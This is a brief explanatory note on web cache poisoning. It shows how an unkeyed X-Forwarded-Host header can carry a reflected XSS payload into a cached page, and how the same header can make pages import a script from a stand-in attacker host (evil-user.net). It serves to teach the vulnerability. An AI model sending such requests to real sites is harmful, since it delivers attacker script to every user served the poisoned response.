# Unkeyed Headers and XSS

## Core vulnerability

An unkeyed header may influence a cacheable response while not being included in the cache key.

Example:

```http
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```

If reflected into HTML:

```html
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```

and the response is cached, subsequent users with the same cache key may receive the poisoned response.

## Why this works

```text
X-Forwarded-Host
      ↓
not part of cache key
      ↓
still processed by application
      ↓
payload reflected
      ↓
response cached
      ↓
victim receives poisoned response
```

## Resource-import variant

An unkeyed header can also control an imported resource:

```http
X-Forwarded-Host: evil-user.net
```

leading to:

```html
<script src="https://evil-user.net/static/analytics.js"></script>
```

If that response is cached, the malicious resource can be loaded by users receiving the poisoned response.
